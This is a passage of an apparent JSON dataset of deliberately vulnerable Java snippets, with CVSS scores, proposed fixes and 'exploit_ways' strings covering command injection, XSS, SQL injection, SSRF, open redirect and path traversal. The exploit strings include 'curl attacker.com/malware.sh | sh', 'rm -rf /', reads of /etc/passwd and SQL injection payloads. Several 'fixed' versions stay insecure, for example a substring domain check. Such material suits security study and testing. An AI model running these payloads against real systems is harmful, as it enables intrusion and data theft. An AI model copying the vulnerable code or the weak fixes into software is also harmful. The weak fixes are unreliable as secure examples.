        "fixed_code": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nclass SafeClass {\n    public static void main(String[] args) throws Exception {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        String command = reader.readLine();\n        if (command.equals(\"allowed_command\")) {\n            Runtime.getRuntime().exec(command);\n        } else {\n            System.out.println(\"Command not allowed\");\n        }\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "java_23": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "public void printMessage(String userInput) {\n    System.out.println(\"User Input: \" + userInput);\n}",
        "cvss_score": 4.3,
        "fixed_code": "import org.owasp.encoder.Encode;\n\npublic void printMessage(String userInput) {\n    String safeInput = Encode.forHtml(userInput);\n    System.out.println(\"User Input: \" + safeInput);\n}",
        "exploit_ways": [
            "An attacker can inject script tags to execute arbitrary JavaScript in the context of a user's browser.",
            "They could use event handlers like 'onload' or 'onclick' to steal cookies or session tokens from other users.",
            "Injecting malicious scripts could redirect users to phishing sites designed to harvest sensitive information."
        ]
    },
    "java_24": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class VulnerableDB {\n    private Connection connect() {\n        String url = \"jdbc:sqlite:sample.db\";\n        Connection conn = null;\n        try {\n            conn = DriverManager.getConnection(url);\n        } catch (SQLException e) {\n            System.out.println(e.getMessage());\n        }\n        return conn;\n    }\n\n    public void query(String username) {\n        String sql = \"SELECT * FROM users WHERE name = '\" + username + \"'\";\n        try (Connection conn = this.connect();\n             Statement stmt = conn.createStatement();\n             ResultSet rs = stmt.executeQuery(sql)) {\n            while (rs.next()) {\n                System.out.println(rs.getInt(\"id\") +  \"\\t\" + \n                                   rs.getString(\"name\") + \"\\t\" +\n                                   rs.getString(\"email\"));\n            }\n        } catch (SQLException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\n\npublic class SecureDB {\n    private Connection connect() {\n        String url = \"jdbc:sqlite:sample.db\";\n        Connection conn = null;\n        try {\n            conn = DriverManager.getConnection(url);\n        } catch (SQLException e) {\n            System.out.println(e.getMessage());\n        }\n        return conn;\n    }\n\n    public void query(String username) {\n        String sql = \"SELECT * FROM users WHERE name = ?\";\n        try (Connection conn = this.connect();\n             PreparedStatement pstmt = conn.prepareStatement(sql)) {\n            pstmt.setString(1, username);\n            ResultSet rs = pstmt.executeQuery();\n            while (rs.next()) {\n                System.out.println(rs.getInt(\"id\") +  \"\\t\" + \n                                   rs.getString(\"name\") + \"\\t\" +\n                                   rs.getString(\"email\"));\n            }\n        } catch (SQLException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could input 'admin' OR '1'='1' to retrieve all user records.",
            "They can use SQL injection to extract data from other tables, such as ' UNION SELECT username, password FROM admin --'.",
            "An attacker might try to cause a denial of service by injecting a large query or using a sleep function like ' OR 1=0 WAITFOR DELAY '0:00:30'"
        ]
    },
    "java_25": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "public class RaceCondition {\n    private static int counter = 0;\n\n    public static void increment() {\n        for (int i = 0; i < 1000; i++) {\n            counter++;\n        }\n    }\n\n    public static void main(String[] args) throws InterruptedException {\n        Thread t1 = new Thread(() -> increment());\n        Thread t2 = new Thread(() -> increment());\n\n        t1.start();\n        t2.start();\n\n        t1.join();\n        t2.join();\n\n        System.out.println(\"Counter: \" + counter);\n    }\n}",
        "cvss_score": 4.3,
        "fixed_code": "public class RaceCondition {\n    private static int counter = 0;\n    private static final Object lock = new Object();\n\n    public static void increment() {\n        synchronized (lock) {\n            for (int i = 0; i < 1000; i++) {\n                counter++;\n            }\n        }\n    }\n\n    public static void main(String[] args) throws InterruptedException {\n        Thread t1 = new Thread(() -> increment());\n        Thread t2 = new Thread(() -> increment());\n\n        t1.start();\n        t2.start();\n\n        t1.join();\n        t2.join();\n\n        System.out.println(\"Counter: \" + counter);\n    }\n}",
        "exploit_ways": [
            "An attacker could manipulate the timing of thread execution to consistently result in a lower final count.",
            "In a larger application, this race condition could lead to inconsistent state updates, causing unexpected behavior or security flaws.",
            "By creating many threads, an attacker might cause a denial-of-service condition if the system runs out of resources due to excessive contention."
        ]
    },
    "java_26": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "import javax.servlet.http.HttpServletResponse;\npublic class VulnerableServlet {\n    public void setHeaders(HttpServletResponse response) {\n        // No security headers are being set\n    }\n}",
        "cvss_score": 6.1,
        "fixed_code": "import javax.servlet.http.HttpServletResponse;\npublic class SecureServlet {\n    public void setHeaders(HttpServletResponse response) {\n        response.setHeader(\"Content-Security-Policy\", \"default-src 'self'\");\n        response.setHeader(\"X-Frame-Options\", \"SAMEORIGIN\");\n        response.setHeader(\"X-XSS-Protection\", \"1; mode=block\");\n        response.setHeader(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\");\n        response.setHeader(\"X-Content-Type-Options\", \"nosniff\");\n    }\n}",
        "exploit_ways": [
            "Attackers can inject malicious scripts into the application due to lack of Content Security Policy.",
            "Clickjacking attacks are possible as X-Frame-Options header is not set.",
            "Cross-Site Scripting (XSS) attacks may succeed because X-XSS-Protection is not enabled."
        ]
    },
    "java_27": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "public void setSessionId(String sessionId) {\n    if (sessionId != null && !sessionId.isEmpty()) {\n        this.sessionId = sessionId;\n    }\n}",
        "cvss_score": 4.0,
        "fixed_code": "import java.util.UUID;\n\npublic void setSessionId() {\n    String newSessionId = UUID.randomUUID().toString();\n    this.sessionId = newSessionId;\n}",
        "exploit_ways": [
            "An attacker can predict or guess session IDs, allowing them to hijack user sessions.",
            "By setting a fixed session ID, an attacker might maintain control over a session after a legitimate user logs in.",
            "Malicious actors could use the ability to set session IDs to perform cross-site request forgery (CSRF) attacks more effectively."
        ]
    },
    "java_28": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "public class InfiniteLoop {\n    public static void main(String[] args) {\n        while (true) {\n            // This loop will run indefinitely\n        }\n    }\n}",
        "cvss_score": 3.0,
        "fixed_code": "public class LimitedLoop {\n    public static void main(String[] args) throws InterruptedException {\n        for (int i = 0; i < 100; i++) {\n            Thread.sleep(100); // Sleep for 100 milliseconds\n            // Process logic here\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can deploy this code to tie up CPU resources, preventing other processes from running.",
            "By executing this in a server environment, it can cause the system to become unresponsive.",
            "Running multiple instances of this code can exhaust system resources leading to a Denial-of-Service."
        ]
    },
    "java_29": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\npublic class NetworkFetcher {\n    public String fetchData(String urlString) throws Exception {\n        URL url = new URL(urlString);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        StringBuilder content = new StringBuilder();\n        String line;\n        while ((line = in.readLine()) != null) {\n            content.append(line);\n        }\n        in.close();\n        return content.toString();\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\npublic class NetworkFetcher {\n    public String fetchData(String urlString) throws Exception {\n        if (!urlString.startsWith(\"https://api.example.com/\")) {\n            throw new IllegalArgumentException(\"Invalid URL\");\n        }\n        URL url = new URL(urlString);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        StringBuilder content = new StringBuilder();\n        String line;\n        while ((line = in.readLine()) != null) {\n            content.append(line);\n        }\n        in.close();\n        return content.toString();\n    }\n}",
        "exploit_ways": [
            "An attacker could input 'http://localhost:8080/secrets' to access internal services.",
            "They might use 'https://attacker.com/malicious-resource' to exfiltrate data via a server-side request.",
            "Inputting 'file:///etc/passwd' can lead to local file inclusion and sensitive information leak."
        ]
    },
    "java_30": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "public class BankAccount {\n    private int balance = 100;\n\n    public void deposit(int amount) {\n        balance += amount;\n    }\n\n    public void withdraw(int amount) {\n        if (balance >= amount) {\n            balance -= amount;\n        }\n    }\n\n    public int getBalance() {\n        return balance;\n    }\n}",
        "cvss_score": 5.0,
        "fixed_code": "public class BankAccount {\n    private int balance = 100;\n    private final Object lock = new Object();\n\n    public void deposit(int amount) {\n        synchronized (lock) {\n            balance += amount;\n        }\n    }\n\n    public void withdraw(int amount) {\n        synchronized (lock) {\n            if (balance >= amount) {\n                balance -= amount;\n            }\n        }\n    }\n\n    public int getBalance() {\n        synchronized (lock) {\n            return balance;\n        }\n    }\n}",
        "exploit_ways": [
            "Multiple threads could deposit money simultaneously, leading to incorrect balance calculations.",
            "Concurrent withdrawals could result in overdraft situations where more money is withdrawn than deposited.",
            "An attacker with control over multiple threads could manipulate the balance by rapidly alternating deposits and withdrawals."
        ]
    },
    "java_31": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "public class RaceCondition {\n    private static int count = 0;\n\n    public static void main(String[] args) {\n        Thread t1 = new Thread(() -> {\n            for (int i = 0; i < 1000; i++) {\n                count++;\n            }\n        });\n        Thread t2 = new Thread(() -> {\n            for (int i = 0; i < 1000; i++) {\n                count--;\n            }\n        });\n        t1.start();\n        t2.start();\n        try {\n            t1.join();\n            t2.join();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        System.out.println(\"Final count: \" + count);\n    }\n}",
        "cvss_score": 5.3,
        "fixed_code": "public class RaceCondition {\n    private static int count = 0;\n    private static final Object lock = new Object();\n\n    public static void main(String[] args) {\n        Thread t1 = new Thread(() -> {\n            for (int i = 0; i < 1000; i++) {\n                synchronized(lock) {\n                    count++;\n                }\n            }\n        });\n        Thread t2 = new Thread(() -> {\n            for (int i = 0; i < 1000; i++) {\n                synchronized(lock) {\n                    count--;\n                }\n            }\n        });\n        t1.start();\n        t2.start();\n        try {\n            t1.join();\n            t2.join();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        System.out.println(\"Final count: \" + count);\n    }\n}",
        "exploit_ways": [
            "An attacker could cause the final count to be incorrect by manipulating thread timing.",
            "If part of a larger system, inconsistent counts could lead to resource misallocation or errors.",
            "In critical applications, such as banking systems, race conditions can lead to unexpected financial discrepancies."
        ]
    },
    "java_32": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "import java.net.URL;\nimport java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class RedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String redirectUrl = request.getParameter(\"url\");\n        if (redirectUrl != null && isValidRedirectUrl(redirectUrl)) {\n            response.sendRedirect(redirectUrl);\n        } else {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid URL\");\n        }\n    }\n\n    private boolean isValidRedirectUrl(String url) {\n        try {\n            new URL(url);\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class RedirectServlet extends HttpServlet {\n    private static final String[] ALLOWED_DOMAINS = {\"example.com\", \"sub.example.com\"};\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String redirectUrl = request.getParameter(\"url\");\n        if (redirectUrl != null && isValidRedirectUrl(redirectUrl)) {\n            response.sendRedirect(redirectUrl);\n        } else {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid URL\");\n        }\n    }\n\n    private boolean isValidRedirectUrl(String url) {\n        for (String domain : ALLOWED_DOMAINS) {\n            if (url.contains(domain)) {\n                return true;\n            }\n        }\n        return false;\n    }\n}",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by appending a URL parameter pointing to an external domain.",
            "Could use the vulnerability to phish users by directing them to a fake login page that mimics a legitimate one.",
            "Potentially exploit for session fixation by redirecting authenticated users to a crafted URL with a fixed session ID."
        ]
    },
    "java_33": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class RedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String url = request.getParameter(\"url\");\n        response.sendRedirect(url);\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class RedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String[] allowedUrls = {\"http://example.com\", \"https://safe-site.com\"};\n        String url = request.getParameter(\"url\");\n        for (String allowedUrl : allowedUrls) {\n            if (allowedUrl.equals(url)) {\n                response.sendRedirect(url);\n                return;\n            }\n        }\n        response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid URL\");\n    }\n}",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by providing an external URL.",
            "They could use the vulnerability to perform phishing attacks by redirecting to fake login pages.",
            "By appending additional URLs or using JavaScript, they might exploit the open redirect for XSS."
        ]
    },
    "java_34": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "public class DoSVulnerableServer {\n    public static void main(String[] args) throws Exception {\n        ServerSocket server = new ServerSocket(8080);\n        System.out.println(\"Server is running on port 8080\");\n        while (true) {\n            Socket client = server.accept();\n            Thread handler = new Thread(() -> {\n                try {\n                    BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));\n                    String line;\n                    while ((line = reader.readLine()) != null) {}\n                } catch (Exception e) {}\n            });\n            handler.start();\n        }\n    }\n}",
        "cvss_score": 3.5,
        "fixed_code": "public class DoSSafeServer {\n    public static void main(String[] args) throws Exception {\n        ServerSocket server = new ServerSocket(8080);\n        System.out.println(\"Server is running on port 8080\");\n        ExecutorService executor = Executors.newFixedThreadPool(10);\n        while (true) {\n            Socket client = server.accept();\n            executor.execute(() -> {\n                try {\n                    BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));\n                    String line;\n                    while ((line = reader.readLine()) != null) {}\n                    client.close();\n                } catch (Exception e) {}\n            });\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can send a large number of connections to exhaust server resources.",
            "By sending infinite data streams, the server threads get stuck in an endless loop.",
            "Using slowloris-style attacks, the server can be overwhelmed with partially open connections."
        ]
    },
    "java_35": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "public class SlowServer {\\n    public static void main(String[] args) throws InterruptedException {\\n        while (true) {\\n            Thread.sleep(10);\\n            if (Math.random() < 0.01) {\\n                heavyComputation();\\n            }\\n        }\\n    }\\n\\n    private static void heavyComputation() {\\n        double result = 0;\\n        for (int i = 0; i < 10000000; i++) {\\n            result += Math.sqrt(i);\\n        }\\n    }\\n}",
        "cvss_score": 4.3,
        "fixed_code": "public class SlowServer {\\n    public static void main(String[] args) throws InterruptedException {\\n        while (true) {\\n            Thread.sleep(10);\\n            if (Math.random() < 0.01) {\\n                Thread computationThread = new Thread(() -> heavyComputation());\\n                computationThread.start();\\n            }\\n        }\\n    }\\n\\n    private static void heavyComputation() {\\n        double result = 0;\\n        for (int i = 0; i < 10000000; i++) {\\n            result += Math.sqrt(i);\\n        }\\n    }\\n}",
        "exploit_ways": [
            "An attacker could cause the server to run many heavy computations concurrently, degrading performance.",
            "By triggering frequent heavy computations, an attacker can exhaust CPU resources on the server.",
            "If this code is part of a larger system, the DoS could propagate and affect other services."
        ]
    },
    "java_36": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "import java.awt.*;\nimport java.awt.event.*;\nimport javax.swing.*;\nclass ClickJackingDemo {\n    public static void main(String[] args) {\n        JFrame frame = new JFrame(\"ClickJacking Example\");\n        frame.setSize(300, 200);\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        JPanel panel = new JPanel() {\n            @Override\n            protected void paintComponent(Graphics g) {\n                super.paintComponent(g);\n                try {\n                    ImageIcon icon = new ImageIcon(\"https://example.com/image.png\");\n                    g.drawImage(icon.getImage(), 0, 0, null);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        };\n        panel.addMouseListener(new MouseAdapter() {\n            @Override\n            public void mouseClicked(MouseEvent e) {\n                JOptionPane.showMessageDialog(null, \"Clicked on transparent area!\");\n            }\n        });\n        frame.add(panel);\n        frame.setVisible(true);\n    }\n}",
        "cvss_score": 3.0,
        "fixed_code": "import java.awt.*;\nimport java.awt.event.*;\nimport javax.swing.*;\nclass ClickJackingDemo {\n    public static void main(String[] args) {\n        JFrame frame = new JFrame(\"ClickJacking Example\");\n        frame.setSize(300, 200);\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        JPanel panel = new JPanel() {\n            @Override\n            protected void paintComponent(Graphics g) {\n                super.paintComponent(g);\n                try {\n                    ImageIcon icon = new ImageIcon(\"https://example.com/image.png\");\n                    g.drawImage(icon.getImage(), 0, 0, this.getWidth(), this.getHeight(), null);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        };\n        panel.addMouseListener(new MouseAdapter() {\n            @Override\n            public void mouseClicked(MouseEvent e) {\n                JOptionPane.showMessageDialog(null, \"Clicked on transparent area!\");\n            }\n        });\n        frame.add(panel);\n        frame.setUndecorated(true);\n        frame.getRootPane().setWindowDecorationStyle(JRootPane.PLAIN_DIALOG);\n        frame.setVisible(true);\n    }\n}",
        "exploit_ways": [
            "An attacker can overlay a transparent malicious button on top of the legitimate one, tricking users into clicking it.",
            "Users could be misled into interacting with hidden or obscured controls, leading to unintended actions.",
            "Malicious actors might use this vulnerability to make users click on buttons they believe are part of a different application."
        ]
    },
    "java_37": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "public class SlowLoop {\n    public static void main(String[] args) {\n        while (true) {\n            try {\n                Thread.sleep(10);\n            } catch (InterruptedException e) {}\n        }\n    }\n}",
        "cvss_score": 3.7,
        "fixed_code": "public class SafeLoop {\n    public static void main(String[] args) throws InterruptedException {\n        while (true) {\n            Thread.sleep(10);\n            // Add meaningful work or exit condition here\n        }\n    }\n}",
        "exploit_ways": [
            "The infinite loop can tie up a thread, making the application unresponsive to other tasks.",
            "Running multiple instances of this program can consume system resources leading to DoS on the server.",
            "By running this code in a production environment, it can prevent other processes from accessing necessary CPU time."
        ]
    },
    "java_38": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "import javax.servlet.http.HttpSession;\\npublic class LoginServlet {\\n    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\\n        HttpSession session = request.getSession(true);\\n        String sessionId = request.getParameter(\"sessionId\");\\n        if (sessionId != null) {\\n            session.changeSessionId(sessionId);\\n        }\\n        // other code\\n    }\\n}",
        "cvss_score": 4.0,
        "fixed_code": "import javax.servlet.http.HttpSession;\\npublic class LoginServlet {\\n    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\\n        HttpSession session = request.getSession(true);\\n        // Do not allow client to specify the session ID\\n        // other code\\n    }\\n}",
        "exploit_ways": [
            "An attacker can provide a fixed session ID via URL parameter to maintain control over a user's session.",
            "By using the same session ID for multiple users, an attacker can hijack legitimate sessions if users log in.",
            "Attacker can exploit this by pre-generating a session ID and tricking users into logging in with it."
        ]
    },
    "java_39": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "public class UserInfo {\n    private String sensitiveData;\n\n    public UserInfo(String data) {\n        this.sensitiveData = data;\n    }\n\n    public void displayInfo() {\n        System.out.println(\"Sensitive Data: \" + this.sensitiveData);\n    }\n}",
        "cvss_score": 3.5,
        "fixed_code": "public class UserInfo {\n    private String sensitiveData;\n\n    public UserInfo(String data) {\n        this.sensitiveData = data;\n    }\n\n    public void displayInfo() {\n        // Sensitive data should not be logged or printed.\n        System.out.println(\"User information displayed\");\n    }\n}",
        "exploit_ways": [
            "An attacker with access to the output could read sensitive data directly.",
            "If logs are stored, they could contain sensitive user information leading to a data breach.",
            "Sensitive data might be inadvertently exposed in debugging or error messages."
        ]
    },
    "java_40": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/example\")\npublic class ExampleServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Welcome to our website</h1>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "cvss_score": 5.3,
        "fixed_code": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/example\")\npublic class ExampleServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        response.setHeader(\"Content-Security-Policy\", \"default-src 'self'\");\n        response.setHeader(\"X-Content-Type-Options\", \"nosniff\");\n        response.setHeader(\"X-XSS-Protection\", \"1; mode=block\");\n        response.setHeader(\"X-Frame-Options\", \"SAMEORIGIN\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Welcome to our website</h1>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "exploit_ways": [
            "Attackers could inject malicious scripts leading to XSS attacks.",
            "Lack of Content-Security-Policy (CSP) can allow loading untrusted content.",
            "Improper X-Frame-Options header can lead to Clickjacking attacks."
        ]
    },
    "java_41": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class FileManager {\n    public static void main(String[] args) {\n        if (args.length > 0) {\n            String filePath = \"/safe/path/\" + args[0].replaceAll(\"\\./\", \"\").replaceAll(\"\\.\\.\", \"\");\n            try (BufferedReader br = new BufferedReader(new FileReader(filePath))) {\n                String line;\n                while ((line = br.readLine()) != null) {\n                    System.out.println(line);\n                }\n            } catch (IOException e) {\n                System.err.println(\"Error reading file: \" + e.getMessage());\n            }\n        }\n    }\n}",
        "cvss_score": 4.0,
        "fixed_code": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class FileManager {\n    private static final String BASE_PATH = \"/safe/path/\";\n\n    public static void main(String[] args) {\n        if (args.length > 0) {\n            String filePath = sanitizeFilePath(args[0]);\n            try (BufferedReader br = new BufferedReader(new FileReader(BASE_PATH + filePath))) {\n                String line;\n                while ((line = br.readLine()) != null) {\n                    System.out.println(line);\n                }\n            } catch (IOException e) {\n                System.err.println(\"Error reading file: \" + e.getMessage());\n            }\n        }\n    }\n\n    private static String sanitizeFilePath(String input) {\n        return input.replaceAll(\"[\\\\./\\\\.\\\\.]+\", \"\");\n    }\n}",
        "exploit_ways": [
            "An attacker could provide a filename that bypasses the regex to access \"/etc/passwd\".",
            "Could use URL encoding like %2e%2e/%2e%2e/ to navigate up directories and read unauthorized files.",
            "By providing a specially crafted filename, an attacker might exploit any weaknesses in regex handling to escape the intended directory."
        ]
    },
    "java_42": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class FileReadServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = \"/var/log/\" + request.getParameter(\"log\");\n        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.getWriter().println(line);\n            }\n        } catch (IOException e) {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \"File not found.\");\n        }\n    }\n}",
        "cvss_score": 5.3,
        "fixed_code": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class FileReadServlet extends HttpServlet {\n    private static final String LOG_DIR = \"/var/log/\";\n    private static final String[] ALLOWED_FILES = {\"app.log\", \"system.log\", \"error.log\"};\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"log\");\n        if (fileName != null && isValidFile(fileName)) {\n            String filePath = LOG_DIR + fileName;\n            try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.getWriter().println(line);\n                }\n            } catch (IOException e) {\n                response.sendError(HttpServletResponse.SC_NOT_FOUND, \"File not found.\");\n            }\n        } else {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid file name.\");\n        }\n    }\n\n    private boolean isValidFile(String fileName) {\n        for (String allowed : ALLOWED_FILES) {\n            if (allowed.equals(fileName)) {\n                return true;\n            }\n        }\n        return false;\n    }\n}",
        "exploit_ways": [
            "An attacker could request \"/etc/passwd\" by manipulating the 'log' parameter to read sensitive system files.",
            "The vulnerability allows reading arbitrary log files, potentially leaking sensitive information stored in logs.",
            "Crafting a path traversal attack with '../' sequences might access files outside the intended /var/log directory if not properly mitigated."
        ]
    },
    "java_43": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "public class VulnerableApp {\\n    public void redirect(String url) {\\n        try {\\n            java.net.URI uri = new java.net.URI(url);\\n            if (uri.getHost().equals(\"trusted.com\")) {\\n                javax.swing.JOptionPane.showMessageDialog(null, \"Redirecting to trusted site: \" + url);\\n            } else {\\n                throw new Exception(\\\"Unauthorized redirect attempt\\\");\\n            }\\n        } catch (Exception e) {\\n            System.out.println(e.getMessage());\\n        }\\n    }\\n}",
        "cvss_score": 6.8,
        "fixed_code": "public class SecureApp {\\n    public void redirect(String url) {\\n        String trustedDomain = \"trusted.com\";\\n        if (url != null && url.startsWith(\"https://\" + trustedDomain)) {\\n            try {\\n                java.net.URI uri = new java.net.URI(url);\\n                javax.swing.JOptionPane.showMessageDialog(null, \"Redirecting to trusted site: \" + url);\\n            } catch (Exception e) {\\n                System.out.println(e.getMessage());\\n            }\\n        } else {\\n            System.out.println(\"Unauthorized redirect attempt\");\\n        }\\n    }\\n}",
        "exploit_ways": [
            "An attacker can use URL encoding to bypass the check (e.g., http%3A//trusted.com).",
            "Crafting a URL like https://malicious.com?redirect=https://trusted.com could trick users into thinking they are on a trusted site.",
            "Using a shortener service for malicious URLs that redirects to trusted.com can deceive security checks."
        ]
    },
    "java_44": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "public class VulnerableRaceCondition {\n    private int counter = 0;\n\n    public void increment() {\n        try {\n            Thread.sleep(1);\n        } catch (InterruptedException e) {}\n        counter++;\n    }\n\n    public int getCounter() {\n        return counter;\n    }\n}",
        "cvss_score": 3.5,
        "fixed_code": "public class SecureRaceCondition {\n    private int counter = 0;\n    private final Object lock = new Object();\n\n    public void increment() {\n        synchronized (lock) {\n            try {\n                Thread.sleep(1);\n            } catch (InterruptedException e) {}\n            counter++;\n        }\n    }\n\n    public int getCounter() {\n        synchronized (lock) {\n            return counter;\n        }\n    }\n}",
        "exploit_ways": [
            "Multiple threads incrementing the counter simultaneously could lead to lost updates, causing the counter value to be incorrect.",
            "An attacker could create a large number of threads to overwhelm the system, potentially causing a denial of service (DoS) condition.",
            "If the counter is used for critical operations like limiting access or resources, an inaccurate count could lead to unauthorized behavior."
        ]
    },
    "java_45": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "public String fixateSession(HttpServletRequest request, HttpServletResponse response) {\n    HttpSession session = request.getSession(true);\n    Cookie sessionCookie = new Cookie(\"JSESSIONID\", session.getId());\n    sessionCookie.setPath(\"\");\n    response.addCookie(sessionCookie);\n    return \"Session fixed\";\n}",
        "cvss_score": 4.2,
